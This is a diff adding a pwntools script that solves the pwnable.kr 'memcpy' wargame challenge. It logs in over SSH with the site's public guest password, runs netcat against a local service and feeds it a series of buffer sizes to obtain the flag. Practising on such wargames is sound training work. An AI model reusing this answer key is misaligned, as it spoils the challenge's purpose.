@@ -1,0 +1,31 @@
+from pwn import *
+
+shell = ssh('memcpy', 'pwnable.kr', 2222, password='guest')
+
+sh = shell.process('/bin/sh', env={'PS1':''})
+#sh.sendline('echo "10 20 40 80 160 320 640 1280 2560 5120" | nc 0 9022')
+sh.sendline('nc 0 9022')
+print(sh.recvuntil("8 ~ 16 :"))
+sh.sendline('10')
+print(sh.recvuntil("16 ~ 32 :"))
+sh.sendline('20')
+print(sh.recvuntil("32 ~ 64 :"))
+sh.sendline('40')
+print(sh.recvuntil("64 ~ 128 :"))
+sh.sendline('80')
+print(sh.recvuntil("128 ~ 256 :"))
+sh.sendline('160')
+print(sh.recvuntil("256 ~ 512 :"))
+sh.sendline('320')
+print(sh.recvuntil("512 ~ 1024 :"))
+sh.sendline('640')
+print(sh.recvuntil("1024 ~ 2048 :"))
+sh.sendline('1280')
+print(sh.recvuntil("2048 ~ 4096 :"))
+sh.sendline('2560')
+print(sh.recvuntil("4096 ~ 8192 :"))
+sh.sendline('5120')
+
+print(sh.recvline())
+print(sh.recv(2560))
+
